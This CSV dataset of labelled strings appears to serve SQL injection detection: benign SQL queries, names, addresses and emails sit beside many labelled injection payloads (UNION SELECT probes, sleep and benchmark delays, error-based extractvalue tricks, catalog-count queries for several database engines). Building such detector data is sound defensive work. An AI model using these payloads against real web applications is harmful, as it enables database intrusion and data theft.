Sentence,Label,Processed_Sentence
SELECT AVG ( vowel ) FROM trade SELECT SUM ( plates ) ,0.0,select avg ( vowel ) from trade select sum ( plates ) 
1'+  (  select 'dhcv' where 9372  =  9372,1.0,0'+  (  select 'dhcv' where 0  =  0
"-9583%""   )    )    union all select 9349,9349,9349,9349,9349,9349,9349--",1.0,"-0%""   )    )    union all select 0,0,0,0,0,0,0--"
SELECT * FROM slowly,0.0,select * from slowly
c/ alcazalquivir s/n,0.0,c/ alcazalquivir s/n
" SELECT column_name ( s )  FROM each,gate",0.0," select column_name ( s )  from each,gate"
"1"" where 9342  =  9342 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --",1.0,"0"" where 0  =  0 and 0  =    (  'qqpjq'||  (  select case 0 when 0 then 0 else 0 end from rdb$database  )  ||'qzvzq'  )  --"
abaeto sanchon,0.0,abaeto sanchon
"1 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  # ehsr",1.0,"0 or 0  =    (  select count  (  *  )   from sysibm.systables as t0,sysibm.systables as t0,sysibm.systables as t0  )  # ehsr"
select   (  case when   (  9540  =  5786  )   then 9540 else 9540*  (  select 9540 from information_schema.character_sets  )   end  )  #,1.0,select   (  case when   (  0  =  0  )   then 0 else 0*  (  select 0 from information_schema.character_sets  )   end  )  #
99431698f,0.0,0f
SELECT * FROM grown WHERE automobile = 'milk'  OR control = 'wild',0.0,select * from grown where automobile = 'milk'  or control = 'wild'
"c/ gustavo adolfo becquer 91,",0.0,"c/ gustavo adolfo becquer 0,"
SELECT * FROM halfway WHERE NOT spell = 'vote'  AND NOT straight = 'ship',0.0,select * from halfway where not spell = 'vote'  and not straight = 'ship'
SELECT AVG ( model ) FROM stick,0.0,select avg ( model ) from stick
SELECT building ( s )  FROM eaten SELECT write ( s ) ,0.0,select building ( s )  from eaten select write ( s ) 
mahbeer,0.0,mahbeer
zapach,0.0,zapach
SELECT * FROM process WHERE eight = 'spell',0.0,select * from process where eight = 'spell'
SELECT * FROM design WHERE smoke  BETWEEN 10 AND 20,0.0,select * from design where smoke  between 0 and 0
"-1668""   )    )     )   or 9323  =  9323#",1.0,"-0""   )    )     )   or 0  =  0#"
SELECT engine FROM began UNION ALL SELECT jet FROM chamber ORDER BY log,0.0,select engine from began union all select jet from chamber order by log
SELECT * FROM weather WHERE NOT stay = 'just'  AND NOT concerned = 'respect',0.0,select * from weather where not stay = 'just'  and not concerned = 'respect'
brian,0.0,brian
"  SELECT * FROM passage WHERE length IN  ( 'bare', 'final', 'off' )  ",0.0,"  select * from passage where length in  ( 'bare', 'final', 'off' )  "
1 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  # cykf,1.0,0 and 0  =  cast   (    (   chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )   ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end   )    )   ::text||  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )    as numeric  )  # cykf
"-1370'   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  'xmrg'  =  'xmrg",1.0,"-0'   )    )     )   or elt  (  0  =  0,0  )   and    (    (     (  'xmrg'  =  'xmrg"
brias,0.0,brias
SELECT * FROM  ( SELECT treated FROM naturally ) ,0.0,select * from  ( select treated from naturally ) 
SELECT * FROM organized WHERE book NOT LIKE '[announced]%',0.0,select * from organized where book not like '[announced]%'
"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'vkde'  =  'vkde",1.0,"0'  )   and extractvalue  (  0,concat  (  0x0c,0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0   )    )    and   (  'vkde'  =  'vkde"
1 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  -- jdia,1.0,0 and 0  =  cast   (    (   chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )   ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end   )    )   ::text||  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )    as numeric  )  -- jdia
6105,0.0,0
"  UPDATE call SET member =  'fifteen', City =  'roar' WHERE first =  spend",0.0,"  update call set member =  'fifteen', city =  'roar' where first =  spend"
rigas.albalak@albeiteria.it,0.0,rigas.albalak@albeiteria.it
SELECT * FROM bar WHERE describe = 'second',0.0,select * from bar where describe = 'second'
-6086'   )    )    or   (  6719  =  7280  )  *7280 and    (    (   'ozbj'  =  'ozbj,1.0,-0'   )    )    or   (  0  =  0  )  *0 and    (    (   'ozbj'  =  'ozbj
-4572'  )   union all select 3520--,1.0,-0'  )   union all select 0--
"valencia, 79 12?h",0.0,"valencia, 0 0?h"
" select * from users where id  =  1 <@$_ union select 1,version  (    )   -- 1",1.0," select * from users where id  =  0 <@$_ union select 0,version  (    )   -- 0"
SELECT COUNT ( DISTINCT play )  FROM ate,0.0,select count ( distinct play )  from ate
SELECT option_value FROM wp_options WHERE option_name  =  'wpassetcleanup_settings' LIMIT 1,0.0,select option_value from wp_options where option_name  =  'wpassetcleanup_settings' limit 0
"-8258""   )    )    as swjp where 2681  =  2681 union all select 2681,2681,2681,2681,2681,2681--",1.0,"-0""   )    )    as swjp where 0  =  0 union all select 0,0,0,0,0,0--"
"1'+  (  select sfuq where 8094  =  8094 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1   )    )   +'",1.0,"0'+  (  select sfuq where 0  =  0 procedure analyse  (  extractvalue  (  0,concat  (  0x0c,  (  benchmark  (  0,md0  (  0x0a0   )    )      )    )     )  ,0   )    )   +'"
1'  )   where 4500  =  4500,1.0,0'  )   where 0  =  0
1 where 8889  =  8889,1.0,0 where 0  =  0
02879028a,0.0,0a
"1""   )    )    and 9800  =  8713",1.0,"0""   )    )    and 0  =  0"
moriyama,0.0,moriyama
SELECT AVG ( without ) FROM because,0.0,select avg ( without ) from because
1%' union all select null--,1.0,0%' union all select null--
"1%""   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1.0,"0%""   )    )    procedure analyse  (  extractvalue  (  0,concat  (  0x0c,  (  benchmark  (  0,md0  (  0x0b0c0   )    )      )    )     )  ,0  )  #"
SELECT * FROM tongue WHERE left = 'father' LIMIT 3,0.0,select * from tongue where left = 'father' limit 0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   ""tbcc""  =  ""tbcc",1.0,"select count  (  *  )   from domain.domains as t0,domain.columns as t0,domain.tables as t0 and    (    (   ""tbcc""  =  ""tbcc"
select   (  case when   (  1093  =  7693  )   then 1093 else 1/  (  select 0  )   end  )  --,1.0,select   (  case when   (  0  =  0  )   then 0 else 0/  (  select 0  )   end  )  --
"  SELECT * FROM layers WHERE mostly NOT IN  ( 'roof', 'rain', 'soon' )  ",0.0,"  select * from layers where mostly not in  ( 'roof', 'rain', 'soon' )  "
"-8981%""   )    )     )   union all select 4538,4538,4538,4538,4538,4538,4538#",1.0,"-0%""   )    )     )   union all select 0,0,0,0,0,0,0#"
mario caraball,0.0,mario caraball
" select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",1.0," select * from users where id  =  0 + \+*$ union select null,@@version -- 0"
SELECT * FROM trace WHERE cutting NOT LIKE 'beyond%',0.0,select * from trace where cutting not like 'beyond%'
"1  )   and make_set  (  8403  =  8403,8899  )  ",1.0,"0  )   and make_set  (  0  =  0,0  )  "
1   )    )    as prxq where 4600  =  4600,1.0,0   )    )    as prxq where 0  =  0
"1'   )    )     )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'vtno'  =  'vtno",1.0,"0'   )    )     )   and 0  =  convert  (  int,  (  select char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0  )  +  (  select   (  case when   (  0  =  0  )   then char  (  0  )   else char  (  0  )   end   )    )   +char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0   )    )     )   and    (    (     (  'vtno'  =  'vtno"
"1'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'cssb'  =  'cssb",1.0,"0'  )   and 0  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  0/0   )    )      )    )    and   (  'cssb'  =  'cssb"
SELECT television ( s )  FROM bill SELECT transportation ( s ) ,0.0,select television ( s )  from bill select transportation ( s ) 
"1' where 3612  =  3612 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1.0,"0' where 0  =  0 and   (  select 0 from  (  select count  (  *  )  ,concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,floor  (  rand  (  0  )  *0   )    )   x from information_schema.character_sets group by x  )  a  )  --"
1  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  6518  =  6518,1.0,0  )   and 0  =  utl_inaddr.get_host_address  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end  )   from dual  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )    and   (  0  =  0
"1""  )   union all select null,null,null,null,null,null--",1.0,"0""  )   union all select null,null,null,null,null,null--"
1 and   (  3020  =  3020  )  *6703-- zsnl,1.0,0 and   (  0  =  0  )  *0-- zsnl
"1' in boolean mode  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1.0,"0' in boolean mode  )   and 0  =    (  select count  (  *  )   from domain.domains as t0,domain.columns as t0,domain.tables as t0  )  --"
monforte del cid,0.0,monforte del cid
lowietje,0.0,lowietje
SELECT * FROM  ( SELECT explanation FROM spin ) ,0.0,select * from  ( select explanation from spin ) 
"1""   )    )     )   union all select null,null,null,null,null,null,null,null#",1.0,"0""   )    )     )   union all select null,null,null,null,null,null,null,null#"
sparky,0.0,sparky
SELECT * FROM win ORDER BY advice,0.0,select * from win order by advice
SELECT * FROM meal WHERE thus = 'development' FETCH FIRST 3 ROWS ONLY,0.0,select * from meal where thus = 'development' fetch first 0 rows only
cervera del ro alhama,0.0,cervera del ro alhama
"-1168   )    )    as vlol where 3475  =  3475 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1.0,"-0   )    )    as vlol where 0  =  0 or 0 group by concat  (  0x0a0,  (  select   (  case when   (  0  =  0  )   then 0 else 0 end   )    )   ,0x0a0a0,floor  (  rand  (  0  )  *0   )    )    having min  (  0  )  #"
"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""okpa""  =  ""okpa",1.0,"0"" and extractvalue  (  0,concat  (  0x0c,0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0   )    )    and ""okpa""  =  ""okpa"
"INSERT INTO fill ( flow, mighty, apple, combination, dance, allow )  VALUES  ( 'pile', 'birds'. detail', 'long', 'image', 'particles', 'have' )  ",0.0,"insert into fill ( flow, mighty, apple, combination, dance, allow )  values  ( 'pile', 'birds'. detail', 'long', 'image', 'particles', 'have' )  "
1  )   where 7165  =  7165 and sleep  (  5  )  #,1.0,0  )   where 0  =  0 and sleep  (  0  )  #
"c/ iglesia, s/n 11?f",0.0,"c/ iglesia, s/n 0?f"
comalada,0.0,comalada
irado,0.0,irado
"1   )    )    or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1.0,"0   )    )    or 0  =    (  select count  (  *  )   from generate_series  (  0,0   )    )   --"
"  SELECT floating,travel FROM sand WHERE feed = 'quickly' UNION SELECT shinning, me FROM declared",0.0,"  select floating,travel from sand where feed = 'quickly' union select shinning, me from declared"
cresta-da,0.0,cresta-da
SELECT spell ( s ) FROM else INNER JOIN,0.0,select spell ( s ) from else inner join
47608,0.0,0
"INSERT INTO boy  ( goose, offer, slabs )  VALUES  ( 'particularly', 'course', 'exact' )  ",0.0,"insert into boy  ( goose, offer, slabs )  values  ( 'particularly', 'course', 'exact' )  "
SELECT DISTINCT circle FROM activity,0.0,select distinct circle from activity
"  SELECT difficultyID AS ID, save AS even FROM highest",0.0,"  select difficultyid as id, save as even from highest"
"1""   )    )    as wfne where 8933  =  8933",1.0,"0""   )    )    as wfne where 0  =  0"
SELECT * FROM tree WHERE most BETWEEN '1996-07-01' AND '1996-07-31',0.0,select * from tree where most between '0-0-0' and '0-0-0'
SELECT * FROM atomic WHERE machinery = 'load'  AND  ( give = 'view' OR toy = 'amount' ) ,0.0,select * from atomic where machinery = 'load'  and  ( give = 'view' or toy = 'amount' ) 
kubrick.blessed@suardistec.ee,0.0,kubrick.blessed@suardistec.ee
SELECT * FROM blue WHERE free = 'officer' LIMIT 3,0.0,select * from blue where free = 'officer' limit 0
"  SELECT climbID AS ID, think AS weight FROM talk",0.0,"  select climbid as id, think as weight from talk"
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  'qomf' like 'qomf",1.0,"select dbms_pipe.receive_message  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ,0  )   from dual and   (  'qomf' like 'qomf"
"  SELECT mentalID AS ID, broad AS sight FROM shelf",0.0,"  select mentalid as id, broad as sight from shelf"
SELECT * FROM keep 3,0.0,select * from keep 0
SELECT * FROM control WHERE remain IN  ( SELECT morning FROM blue ) ,0.0,select * from control where remain in  ( select morning from blue ) 
65782684q,0.0,0q
tejeda y segoyuela,0.0,tejeda y segoyuela
"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'tetk'  =  'tetk",1.0,"0'  )   or extractvalue  (  0,concat  (  0x0c,0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0   )    )    and   (  'tetk'  =  'tetk"
 (  8266  =  8266  )  *9900,1.0, (  0  =  0  )  *0
SELECT number ( s )  FROM here FULL OUTER JOIN,0.0,select number ( s )  from here full outer join
"1%""   )    )    rlike sleep  (  5  )   and    (    (   ""%""  =  """,1.0,"0%""   )    )    rlike sleep  (  0  )   and    (    (   ""%""  =  """
"1'||  (  select 'wyng' from dual where 2157  =  2157 union all select null,null--",1.0,"0'||  (  select 'wyng' from dual where 0  =  0 union all select null,null--"
"  UPDATE family SET dirt =  'alphabet', City =  'specific' WHERE pain =  temperature",0.0,"  update family set dirt =  'alphabet', city =  'specific' where pain =  temperature"
""" or """"*""",1.0,""" or """"*"""
5ictoriosamente,0.0,0ictoriosamente
SELECT * FROM person  WHERE feathers = solid,0.0,select * from person  where feathers = solid
SELECT * FROM inch WHERE five = 'strike' FETCH FIRST 3 ROWS ONLY,0.0,select * from inch where five = 'strike' fetch first 0 rows only
1'  )   and   (  3020  =  3020  )  *6703,1.0,0'  )   and   (  0  =  0  )  *0
47609,0.0,0
"1'||  (  select 'hrpa' where 1973  =  1973 union all select null,null,null,null,null,null,null,null,null--",1.0,"0'||  (  select 'hrpa' where 0  =  0 union all select null,null,null,null,null,null,null,null,null--"
"1%'   )    )    or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   '%'  =  '",1.0,"0%'   )    )    or   (  select 0*  (  if   (    (   select * from   (  select concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,0x0   )    )   s  )  , 0, 0   )    )     )   and    (    (   '%'  =  '"
"1   )    )    as jyfo where 8121  =  8121 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1.0,"0   )    )    as jyfo where 0  =  0 and 0  =    (  select count  (  *  )   from rdb$fields as t0,rdb$types as t0,rdb$collations as t0,rdb$functions as t0  )  --"
6140460000000000,0.0,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 9369 )  ORDER BY meta_id ASC",0.0,"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 0 )  order by meta_id asc"
SELECT * FROM zulu WHERE respect LIKE '%death%',0.0,select * from zulu where respect like '�ath%'
" SELECT * FROM charge ORDER BY free ASC, brush DESC",0.0," select * from charge order by free asc, brush desc"
SELECT * FROM edge WHERE electric = 'flies'  OR saw = 'shaking',0.0,select * from edge where electric = 'flies'  or saw = 'shaking'
4725,0.0,0
"  SELECT * FROM string WHERE stranger NOT IN  ( 'swim', 'art', 'arrive' )  ",0.0,"  select * from string where stranger not in  ( 'swim', 'art', 'arrive' )  "
SELECT TOP 3 * FROM plenty WHERE dawn = 'conversation',0.0,select top 0 * from plenty where dawn = 'conversation'
alcoleja,0.0,alcoleja
SELECT AVG ( property ) FROM flame SELECT SUM ( melted ) ,0.0,select avg ( property ) from flame select sum ( melted ) 
"   SELECT slipped, sister, street FROM exactly WHERE blood  IS NULL",0.0,"   select slipped, sister, street from exactly where blood  is null"
"-1617%"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """,1.0,"-0%"" or 0 in    (    (   char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0  )  +  (  select   (  case when   (  0  =  0  )   then char  (  0  )   else char  (  0  )   end   )    )   +char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0   )    )     )   and ""%""  =  """
"1'  )   and make_set  (  8403  =  8403,8899  )   and   (  'kyxl'  =  'kyxl",1.0,"0'  )   and make_set  (  0  =  0,0  )   and   (  'kyxl'  =  'kyxl"
-3582'  )   or 6872  =  6872 and   (  'gyfj'  =  'gyfj,1.0,-0'  )   or 0  =  0 and   (  'gyfj'  =  'gyfj
fisgar,0.0,fisgar
"1"" or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""pnub""  =  ""pnub",1.0,"0"" or exp  (  ~  (  select * from   (  select concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,0x0   )    )   x   )    )    and ""pnub""  =  ""pnub"
1' where 5778  =  5778,1.0,0' where 0  =  0
sirola@professionalhost.cc,0.0,sirola@professionalhost.cc
SELECT AVG ( fort ) FROM interior,0.0,select avg ( fort ) from interior
SELECT * FROM mass WHERE ocean = 'syllable'  AND City = 'characteristic',0.0,select * from mass where ocean = 'syllable'  and city = 'characteristic'
SELECT * FROM scientific,0.0,select * from scientific
rigente,0.0,rigente
1 and sleep  (  5  )  -- ruuv,1.0,0 and sleep  (  0  )  -- ruuv
select sleep  (  5  )   and   (  'vwmx'  =  'vwmx,1.0,select sleep  (  0  )   and   (  'vwmx'  =  'vwmx
SELECT TOP 50 PERCENT * FROM saved SELECT * FROM detail FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM two,0.0,select top 0 percent * from saved select * from detail fetch first 0 percent rows onlyselect top 0 * from two
1 where 4940  =  4940,1.0,0 where 0  =  0
1  )   where 4573  =  4573,1.0,0  )   where 0  =  0
eial,0.0,eial
protti tarrasa,0.0,protti tarrasa
31819774x,0.0,0x
SELECT bring ( s )  FROM alphabet LEFT JOIN,0.0,select bring ( s )  from alphabet left join
quiles,0.0,quiles
kouhi,0.0,kouhi
"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null#",1.0,"0' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null#"
SELECT baseball ( s )  FROM limited SELECT safe ( s ) ,0.0,select baseball ( s )  from limited select safe ( s ) 
"1%' or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1.0,"0%' or 0  =    (  select count  (  *  )   from domain.domains as t0,domain.columns as t0,domain.tables as t0  )  --"
"-3562""  )   as eghl where 7094  =  7094 union all select 7094,7094,7094,7094#",1.0,"-0""  )   as eghl where 0  =  0 union all select 0,0,0,0#"
SELECT connected ( s ) FROM tightly INNER JOIN,0.0,select connected ( s ) from tightly inner join
"-5755"" or 3581  =  7566",1.0,"-0"" or 0  =  0"
8510000000000000,0.0,0
pockett_miguelin@noviasteresapalacios.aw,0.0,pockett_miguelin@noviasteresapalacios.aw
SELECT fewer ( s )  FROM life SELECT throughout FROM ear,0.0,select fewer ( s )  from life select throughout from ear
1'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   'ckmm' like 'ckmm,1.0,0'   )    )    or   (  select * from   (  select  (  sleep  (  0   )    )     )  ydpu  )   and    (    (   'ckmm' like 'ckmm
SELECT * FROM chapter,0.0,select * from chapter
"1""  )   where 9062  =  9062",1.0,"0""  )   where 0  =  0"
dotty,0.0,dotty
SELECT TOP 3 * FROM carefully,0.0,select top 0 * from carefully
SELECT * FROM buffalo WHERE copy IN  ( SELECT maybe FROM division ) ,0.0,select * from buffalo where copy in  ( select maybe from division ) 
"   SELECT Employees.was, COUNT ( Orders.streetID )  AS schoolFROM    ( OrdersINNER JOIN jar ON Orders.cookiesID  =  Employees.helloID ) ",0.0,"   select employees.was, count ( orders.streetid )  as schoolfrom    ( ordersinner join jar on orders.cookiesid  =  employees.helloid ) "
1' where 9216  =  9216,1.0,0' where 0  =  0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4",1.0,"select count  (  *  )   from rdb$fields as t0,rdb$types as t0,rdb$collations as t0,rdb$functions as t0"
"1 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  # cgow",1.0,"0 and 0  =    (  select count  (  *  )   from sysibm.systables as t0,sysibm.systables as t0,sysibm.systables as t0  )  # cgow"
SELECT AVG ( consonant ) FROM music SELECT SUM ( dinner ) ,0.0,select avg ( consonant ) from music select sum ( dinner ) 
SELECT COUNT ( diagram )  FROM longer,0.0,select count ( diagram )  from longer
kavid,0.0,kavid
" SELECT COUNT ( CustomerID ) , Country FROM Customers GROUP BY Country  HAVING COUNT ( CustomerID )  > 5;",0.0," select count ( customerid ) , country from customers group by country  having count ( customerid )  > 0;"
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'tmdj' like 'tmdj",1.0,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  0  )  ||char  (  0  )  ||char  (  0  )  ,null  )  ,0  )  ,0  )  ,null  )   and 'tmdj' like 'tmdj"
"1   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1.0,"0   )    )     )   and 0  =    (  select count  (  *  )   from domain.domains as t0,domain.columns as t0,domain.tables as t0  )  --"
novelador,0.0,novelador
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""xxug""  =  ""xxug",1.0,"call regexp_substring  (  repeat  (  right  (  char  (  0  )  ,0  )  ,0  )  ,null  )   and    (    (     (  ""xxug""  =  ""xxug"
83236273d,0.0,0d
"  UPDATE political SET bridge =  'eventually', City =  'youth' WHERE tone =  cloth",0.0,"  update political set bridge =  'eventually', city =  'youth' where tone =  cloth"
1%'   )    )     )   and sleep  (  5  )   and    (    (     (  '%'  =  ',1.0,0%'   )    )     )   and sleep  (  0  )   and    (    (     (  '%'  =  '
toolbox,0.0,toolbox
1523490000000000,0.0,0
3658500000000000,0.0,0
"   SELECT Employees.cat, COUNT ( Orders.doorID )  AS newspaperFROM    ( OrdersINNER JOIN hand ON Orders.droveID  =  Employees.fartherID ) ",0.0,"   select employees.cat, count ( orders.doorid )  as newspaperfrom    ( ordersinner join hand on orders.droveid  =  employees.fartherid ) "
trespalacios latorre,0.0,trespalacios latorre
SELECT * FROM breathing WHERE dropped NOT LIKE 'bottom%',0.0,select * from breathing where dropped not like 'bottom%'
"-1004"" where 6266  =  6266 order by 1#",1.0,"-0"" where 0  =  0 order by 0#"
SELECT * FROM tears FETCH FIRST 50 PERCENT ROWS ONLY,0.0,select * from tears fetch first 0 percent rows only
"1   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1.0,"0   )    )    or 0  =    (  select count  (  *  )   from all_users t0,all_users t0,all_users t0,all_users t0,all_users t0  )  --"
1%'  )   or sleep  (  5  )   and   (  '%'  =  ',1.0,0%'  )   or sleep  (  0  )   and   (  '%'  =  '
boggs@cocteleria.dz,0.0,boggs@cocteleria.dz
 UPDATE tight SET several = 'pattern'WHERE goose = 'reach',0.0, update tight set several = 'pattern'where goose = 'reach'
"1""  )   and 4760  =  2922",1.0,"0""  )   and 0  =  0"
"  SELECT somewhere,list,up FROM log LEFT JOIN Orders ON income.pieID =  later.disappear ORDER BY summer.coast",0.0,"  select somewhere,list,up from log left join orders on income.pieid =  later.disappear order by summer.coast"
m_at1i852se,0.0,m_at0i0se
SELECT * FROM slide 3 SELECT * FROM rope,0.0,select * from slide 0 select * from rope
els,0.0,els
